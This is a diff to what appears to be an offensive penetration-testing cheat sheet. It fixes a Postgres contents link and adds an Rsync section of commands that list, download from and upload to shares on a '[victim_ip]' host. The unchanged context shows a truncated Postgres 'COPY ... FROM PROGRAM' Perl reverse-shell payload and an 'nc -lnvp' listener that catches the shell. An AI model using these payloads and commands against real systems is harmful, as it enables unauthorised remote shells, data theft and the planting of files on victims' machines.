@@ -22,7 +22,8 @@
 - [Apache Tomcat](#Apache-Tomcat)
 - [Active Directory](#Active-Directory)
 - [MSSQL](#MSSQL)
-- [Postgres][#Postgres]
+- [Postgres](#Postgres)
+- [Rsync](#Rsync)
 
 --------------------------------------------------------------------------------------------------------------------------------
 
@@ -1387,4 +1388,46 @@ COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket
 
 On machine over your control
 nc -lnvp [port]
+```
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# Rsync
+
+--------------------------------------------------------------------------------------------------------------------------------
+- List existing shares
+```
+rsync [victim_ip]::
+
+rsync -av --list-only rsync://[victim_ip]
+```
+
+- List existing share with credential 
+```
+rsync -av --list-only rsync://username@[victim_ip]/shared_name
+```
+
+- List folders and files recursively
+```
+rsync -r [victim_ip]::shared_name
+```
+
+- Download files
+```
+rsync [victim_ip]::files/home/test/myfile.txt  .
+```
+
+- Download folders
+```
+rsync -r [victim_ip]::files/home/test/
+```
+
+- Upload file
+```
+rsync file_name [victim_ip]::shared_name
+```
+
+- Upload folder
+```
+rsync -r folder_name [victim_ip]::shared_name/.folder_name
 ```
